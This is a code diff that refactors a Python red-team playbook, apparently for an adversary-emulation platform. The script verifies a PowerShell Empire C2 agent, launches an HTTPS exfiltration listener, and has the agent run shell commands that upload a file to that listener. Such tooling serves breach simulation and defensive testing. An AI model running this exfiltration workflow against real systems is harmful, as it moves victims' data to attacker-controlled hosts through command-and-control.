@@ -1,7 +1,6 @@
 # Import the supporting Python packages.
 import re
 import os
-import json
 import string
 import random
 import pprint
@@ -94,44 +93,15 @@ def get_task_status(tn):
     return task_details
 
 
-# A 'while loop' can be used to continually pull the results queue until the command results are returned.
-def get_command_results(tn, ic, ii, print_output=True):
-    results = []
-    command_finished = None
-    try:
-        while not command_finished:
-            command_results = h.get_task_results(tn)
-            if 'queue' in command_results:
-                for entry in command_results['queue']:
-                    if entry['instruct_command'] == ic and entry['instruct_instance'] == ii:
-                        command_finished = True
-                        if print_output:
-                            print(f'\n{tn} {ic} results:')
-                            pp.pprint(entry)
-                        results.append(entry)
-            if not command_finished:
-                t.sleep(5)
-    except KeyboardInterrupt:
-        print('get_command_results interrupted. Initiating clean_up.')
-        clean_up()
-    return results
-
-
 def clean_up():
     if exfil_task_exists:
-        print(f'\nKilling Exfil task {exfil_task_exists}.')
-        instruct_instance = 'clean_up'
-        instruct_command = 'terminate'
-        h.instruct_task(exfil_task_exists, instruct_instance, instruct_command)
-        command_finished = None
-        while not command_finished:
-            kill_task_results = h.get_task_results(exfil_task_exists)
-            for entry in kill_task_results['queue']:
-                if entry['instruct_command'] == instruct_command and entry['instruct_instance'] == instruct_instance:
-                    print('Task terminated.')
-                    command_finished = True
-            if not command_finished:
-                t.sleep(5)
+        print(f'\nShutting down Exfil task {exfil_task_exists}.\n')
+        task_shutdown_response = h.task_shutdown(exfil_task_exists)
+        if 'completed' not in task_shutdown_response:
+            print(f'Task shutdown for {exfil_task_exists} failed.\n')
+            print(task_shutdown_response)
+            exit('\nExiting.')
+        t.sleep(5)
 
     if exfil_portgroup_exists:
         # Delete the Exfil portgroup.
@@ -142,68 +112,52 @@ def clean_up():
     exit('\nDone... Exiting.\n')
 
 
+# Get task list to verify task availability
+task_list = h.list_tasks()
+
 # Verify c2_task exists
 print(f'\nVerifying that C2 task {c2_task_name} exists.')
-task_list = h.list_tasks()
-if c2_task_name in task_list['tasks']:
-    c2_task_details = h.get_task(c2_task_name)
-    if c2_task_details['task_type'] == 'powershell_empire':
-        print(f'C2 task {c2_task_name} found.')
-    else:
-        exit(f'{c2_task_name} found but task_type is not "powershell_empire" - exiting...')
+c2_task = h.verify_task(c2_task_name, 'trainman')
+if c2_task:
+    print(f'C2 task {c2_task_name} found.')
 else:
-    exit(f'C2 task {c2_task_name} does not exist. Exiting...')
+    exit(f'No powershell_empire task with name {c2_task_name} was found. Exiting...')
 
 # Verify remote_ad_task exists
 print(f'\nVerifying that trainman task {remote_ad_task_name} exists.')
 target_ip = None
-task_list = h.list_tasks()
-if remote_ad_task_name in task_list['tasks']:
-    remote_ad_task_details = h.get_task(remote_ad_task_name)
-    if remote_ad_task_details['task_type'] == 'trainman':
-        print(f'Trainman task {remote_ad_task_name} found.')
-    else:
-        exit(f'{remote_ad_task_name} found but task_type is not "trainman" - exiting...')
+remote_ad_task = h.verify_task(remote_ad_task_name, 'trainman')
+if remote_ad_task:
+    print(f'Trainman task {remote_ad_task_name} found.')
     target_ip = get_task_target_ip(remote_ad_task_name)
 else:
-    exit(f'\nTrainman task {remote_ad_task_name} does not exist. Exiting...')
+    exit(f'No trainman task with name {remote_ad_task_name} was found. Exiting...')
 
 # Verify remote_c2_agent_task exists
 print(f'\nVerifying that trainman task {remote_c2_agent_task_name} exists.')
 agent_ip = None
-task_list = h.list_tasks()
-if remote_c2_agent_task_name in task_list['tasks']:
-    remote_c2_agent_task_details = h.get_task(remote_c2_agent_task_name)
-    if remote_c2_agent_task_details['task_type'] == 'trainman':
-        print(f'Trainman task {remote_c2_agent_task_name} found.')
-    else:
-        exit(f'{remote_c2_agent_task_name} found but task_type is not "trainman" - exiting...')
-    agent_ip = remote_c2_agent_task_details['attack_ip']
+agent_task = h.verify_task(remote_c2_agent_task_name, 'trainman')
+if agent_task:
+    print(f'Trainman task {remote_c2_agent_task_name} found.')
+    agent_ip = agent_task['attack_ip']
 else:
-    exit(f'\nTrainman task {remote_c2_agent_task_name} does not exist. Exiting...')
+    exit(f'No trainman task with name {remote_c2_agent_task_name} was found. Exiting...')
 
 # Verify that the C2 agent exists.
 print(f'\nVerifying that agent {c2_agent_name} exists.')
 c2_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))
 c2_instruct_command = 'get_agents'
 c2_instruct_args = {'Name': c2_agent_name}
-agents_list = h.instruct_task(c2_task_name, c2_instruct_instance, c2_instruct_command, c2_instruct_args)
-
-# Get the agent_shell_command confirmation.
-print(f'\nWaiting for results of get_agents command.\n')
-get_agents_results = get_command_results(c2_task_name, c2_instruct_command, c2_instruct_instance)
-for ga_result in get_agents_results:
-    if ga_result['instruct_command'] == c2_instruct_command and ga_result['instruct_instance'] == c2_instruct_instance:
-        instruct_command_output = json.loads(ga_result['instruct_command_output'])
-        agent_exists = False
-        for agent in instruct_command_output['agents']:
-            if c2_agent_name == agent['name']:
-                agent_exists = True
-        if agent_exists:
-            print(f'Agent {c2_agent_name} exists. Continuing...\n')
-        else:
-            print(f'Agent {c2_agent_name} not found. Exiting...\n')
-            clean_up()
+agents_list = h.interact_with_task(c2_task_name, c2_instruct_instance, c2_instruct_command, c2_instruct_args)
+agent_exists = False
+for agent in agents_list['agents']:
+    if c2_agent_name == agent['name']:
+        agent_exists = True
+if agent_exists:
+    print(f'Agent {c2_agent_name} exists. Continuing...\n')
+else:
+    print(f'Agent {c2_agent_name} not found. Exiting...\n')
+    clean_up()
 
 # Create a portgroup for the Exfil task.
 print(f'\nCreating a portgroup for the Exfil task.')
@@ -222,7 +176,7 @@ if exfil_task_domain_name == 'None':
 else:
     exfil_task_host_name = exfil_type
 print(f'\nLaunching exfil task with name {exfil_task_name}.')
-h.run_task(
+exfil_task = h.task_startup(
     exfil_task_name,
     'exfilkit',
     task_host_name=exfil_task_host_name,
@@ -230,11 +184,7 @@ h.run_task(
     portgroups=portgroups
 )
 exfil_task_exists = exfil_task_name
-
-# Wait for the exfil task to become ready.
-print(f'\nWaiting for exfil task {exfil_task_name} to become ready.')
-exfil_task_status = get_task_status(exfil_task_name)
-exfil_task_ip = exfil_task_status['attack_ip']
+exfil_task_ip = exfil_task['attack_ip']
 print(f'\nThe exfil task is ready with the following parameters:')
 print(f'\nIP - {exfil_task_ip}')
 print(f'\nHost name - {exfil_task_host_name}')
@@ -247,19 +197,13 @@ exfil_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in r
 print(f'\nStarting an exfil listener service on {exfil_task_name}.')
 instruct_args = {'port': int(exfil_port), 'subj': exfil_subj}
 instruct_command = 'start_https_exfil_server'
-h.instruct_task(exfil_task_name, exfil_instruct_instance, instruct_command, instruct_args)
-
-# Get the start_https_exfil_server command results.
-start_exfil_server_results = get_command_results(exfil_task_name, instruct_command, exfil_instruct_instance)
-for se_result in start_exfil_server_results:
-    if se_result['instruct_command'] == instruct_command and se_result['instruct_instance'] == exfil_instruct_instance:
-        instruct_command_output = json.loads(se_result['instruct_command_output'])
-        if instruct_command_output['outcome'] == 'success':
-            print('\nstart_https_exfil_server succeeded.\n')
-            exfil_service_exists = [exfil_task_name, exfil_instruct_instance]
-        else:
-            print('\nstart_https_exfil_server failed... Exiting.\n')
-            clean_up()
+exfil_listener = h.interact_with_task(exfil_task_name, exfil_instruct_instance, instruct_command, instruct_args)
+if exfil_listener['outcome'] == 'success':
+    print('\nstart_https_exfil_server succeeded.\n')
+    exfil_service_exists = [exfil_task_name, exfil_instruct_instance]
+else:
+    print('\nstart_https_exfil_server failed... Exiting.\n')
+    clean_up()
 
 # Setup exfil host.
 if exfil_task_domain_name != 'None':
@@ -290,18 +234,11 @@ for command in command_list.split(', '):
     sc_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))
     instruct_command = 'agent_shell_command'
     instruct_args = {'Name': c2_agent_name, 'command': shell_command}
-    h.instruct_task(c2_task_name, sc_instruct_instance, instruct_command, instruct_args)
-
-    # Get the agent_shell_command confirmation.
-    print(f'\nWaiting for confirmation of agent_shell_command "{shell_command}".\n')
-    shell_command_confirmation = get_command_results(c2_task_name, instruct_command, sc_instruct_instance)
-    for sc_conf in shell_command_confirmation:
-        if sc_conf['instruct_command'] == instruct_command and sc_conf['instruct_instance'] == sc_instruct_instance:
-            instruct_command_output = json.loads(sc_conf['instruct_command_output'])
-            if instruct_command_output['outcome'] == 'success':
-                print(f'{shell_command} succeeded.\n')
-            else:
-                print(f'{shell_command} failed.\n')
+    command_response = h.interact_with_task(c2_task_name, sc_instruct_instance, instruct_command, instruct_args)
+    if command_response['outcome'] == 'success':
+        print(f'{shell_command} succeeded.\n')
+    else:
+        print(f'{shell_command} failed.\n')
 
     # Get the agent_shell_command results.
     print(f'\nGetting results from agent_shell_command "{shell_command}"\n')
@@ -310,22 +247,15 @@ for command in command_list.split(', '):
         try:
             instruct_command = 'get_shell_command_results'
             instruct_args = {'Name': c2_agent_name}
-            h.instruct_task(c2_task_name, sc_instruct_instance, instruct_command, instruct_args)
-
-            # Get the output from the get_shell_command_results command.
-            shell_command_results = get_command_results(c2_task_name, instruct_command, sc_instruct_instance, False)
-            for sc_result in shell_command_results:
-                if sc_result['instruct_command'] == instruct_command and \
-                        sc_result['instruct_instance'] == sc_instruct_instance:
-                    instruct_command_output = json.loads(sc_result['instruct_command_output'])
-                    if instruct_command_output['outcome'] == 'success':
-                        results = instruct_command_output['results'][results_count]['results']
-                    else:
-                        results = f'{shell_command} failed.\n'
+            shell_results = h.interact_with_task(c2_task_name, sc_instruct_instance, instruct_command, instruct_args)
+            if shell_results['outcome'] == 'success':
+                results = shell_results['results'][results_count]['results']
+            else:
+                results = f'{shell_command} failed.\n'
             if not results:
                 t.sleep(10)
         except KeyboardInterrupt:
-            exit('get_command_results interrupted. Exiting...')
+            exit('Interrupting get_shell_command_results. Exiting...')
     print(f'\n{shell_command} results:\n')
     print(results)
     results_count += 1
@@ -341,25 +271,19 @@ for command in command_list.split(', '):
 confirm_exfil_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))
 print(f'\nConfirming that {exfil_outfile} was successfully uploaded to {exfil_task_name}.')
 instruct_command = 'ls'
-h.instruct_task(exfil_task_name, confirm_exfil_instruct_instance, instruct_command)
-
-# Get the ls command results.
-ls_results = get_command_results(exfil_task_name, instruct_command, confirm_exfil_instruct_instance)
-for ls_result in ls_results:
-    if ls_result['instruct_command'] == instruct_command and ls_result['instruct_instance'] == confirm_exfil_instruct_instance:
-        instruct_command_output = json.loads(ls_result['instruct_command_output'])
-        if instruct_command_output['outcome'] == 'success':
-            dir_contents = instruct_command_output['local_directory_contents']
-            if exfil_outfile in dir_contents:
-                print(f'\nUpload of {exfil_outfile} succeeded.\n')
-                print(f'{exfil_task_name} local directory contents:\n')
-                pp.pprint(dir_contents)
-            else:
-                print(f'\nUpload of {exfil_outfile} failed.\n')
-                print(f'{exfil_task_name} local directory contents:\n')
-                pp.pprint(dir_contents)
-        else:
-            print(f'\nCould not list local directory contents for task {exfil_task_name}.\n')
+ls_command = h.interact_with_task(exfil_task_name, confirm_exfil_instruct_instance, instruct_command)
+if ls_command['outcome'] == 'success':
+    dir_contents = ls_command['local_directory_contents']
+    if exfil_outfile in dir_contents:
+        print(f'\nUpload of {exfil_outfile} succeeded.\n')
+        print(f'{exfil_task_name} local directory contents:\n')
+        pp.pprint(dir_contents)
+    else:
+        print(f'\nUpload of {exfil_outfile} failed.\n')
+        print(f'{exfil_task_name} local directory contents:\n')
+        pp.pprint(dir_contents)
+else:
+    print(f'\nCould not list local directory contents for task {exfil_task_name}.\n')
 
 # Playbook is complete.
 print('\nPlaybook operation completed. Cleaning up...')
